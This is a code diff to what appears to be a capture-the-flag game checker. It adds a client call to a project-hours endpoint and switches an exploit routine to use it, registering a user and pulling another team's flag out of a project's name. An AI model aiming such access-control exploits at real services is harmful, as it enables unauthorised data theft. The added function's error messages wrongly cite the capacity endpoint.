@@ -183,6 +183,25 @@ async def get_project(client: AsyncClient, id: int, logger: LoggerAdapter) -> Pr
     return project
 
 
+async def set_hours(client: AsyncClient, employee_id: int, project_id: int, hours: int, logger: LoggerAdapter) -> ProjectDto:
+    try:
+        headers = {"User-Agent": get_user_agent()}
+        response = await client.post(
+            "/api/project/hours", data={"employeeId": employee_id, "projectId": project_id, "hours": hours}, headers=headers
+        )
+        logger.debug(f"{response.status_code} {response.text}")
+    except RequestError:
+        raise MumbleException("/api/project/capacity request error")
+    assert_equals(response.status_code, 200, "POST /api/project/capacity failed")
+
+    try:
+        account = ProjectDto.from_json(response.text)  # type: ignore
+    except:
+        raise MumbleException("POST /api/project/capacity returned unexpected data")
+
+    return account
+
+
 async def set_capacity(client: AsyncClient, employee_id: int, project_id: int, start: datetime, capacity: int, logger: LoggerAdapter) -> ProjectDto:
     try:
         headers = {"User-Agent": get_user_agent()}
@@ -354,7 +373,7 @@ async def exploit_project_name(task: ExploitCheckerTaskMessage, searcher: FlagSe
     project_id = json.loads(task.attack_info)["projectId"]  # type: ignore
 
     (employee, _cookie) = await register_user(client, "Kevin", "Penispumpenshop24.de", None, logger)
-    account = await set_capacity(client, employee.id, project_id, datetime.now(), 0, logger)
+    account = await set_hours(client, employee.id, project_id, 0, logger)
 
     flag = searcher.search_flag(account.name)
     if flag:
